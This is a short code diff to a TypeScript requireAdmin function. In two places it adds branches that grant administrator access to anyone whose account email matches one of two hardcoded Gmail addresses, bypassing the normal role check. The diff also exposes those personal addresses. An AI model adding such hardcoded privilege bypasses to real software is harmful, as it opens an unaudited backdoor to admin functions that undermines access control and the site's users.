@@ -92,6 +92,12 @@ export async function requireAdmin(req?: Request): Promise<string | null> {
             ) {
               return userData.user.id;
             }
+            if (
+              userData.user.email === 'angatsaha825@gmail.com' ||
+              userData.user.email === 'careerguidanceacademy2019@gmail.com'
+            ) {
+              return userData.user.id;
+            }
           }
         } catch {}
       }
@@ -102,6 +108,12 @@ export async function requireAdmin(req?: Request): Promise<string | null> {
   try {
     const session = await requireActiveSession();
     if (session && (session.role === 'admin' || session.role === 'ADMIN')) return session.userId;
+    if (
+      session?.user?.email === 'angatsaha825@gmail.com' ||
+      session?.user?.email === 'careerguidanceacademy2019@gmail.com'
+    ) {
+      return session.userId;
+    }
   } catch {}
 
   return null;
